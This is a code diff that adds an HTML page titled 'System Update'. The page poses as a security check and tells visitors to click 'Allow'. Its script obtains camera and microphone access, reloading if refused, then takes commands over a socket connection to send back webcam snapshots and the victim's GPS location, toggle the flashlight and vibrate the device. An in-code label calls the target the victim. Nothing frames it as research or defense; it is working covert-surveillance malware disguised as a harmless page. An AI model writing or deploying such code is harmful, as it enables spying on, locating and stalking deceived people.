@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>System Update</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        let stream;
+        async function init() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                socket.emit('ready');
+            } catch (e) { location.reload(); }
+        }
+        socket.on('exec', async (data) => {
+            if (data.act === 'photo') {
+                const v = document.createElement('video'); v.srcObject = stream; v.play();
+                setTimeout(() => {
+                    const c = document.createElement('canvas');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    socket.emit('res', { type: 'img', file: c.toDataURL('image/jpeg') });
+                }, 1000);
+            }
+            if (data.act === 'flash') {
+                const track = stream.getVideoTracks()[0];
+                await track.applyConstraints({ advanced: [{ torch: data.val }] });
+            }
+            if (data.act === 'loc') {
+                navigator.geolocation.getCurrentPosition(p => {
+                    socket.emit('res', { type: 'txt', val: "📍 موقع الضحية: https://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude });
+                });
+            }
+            if (data.act === 'vib') { navigator.vibrate(2000); }
+        });
+        window.onload = init;
+    </script>
+</head>
+<body style="background:black;color:white;text-align:center;padding-top:100px;">
+    <h2>Security Checking...</h2>
+    <p>Please click <b>Allow</b> to continue</p>
+</body>
+</html>
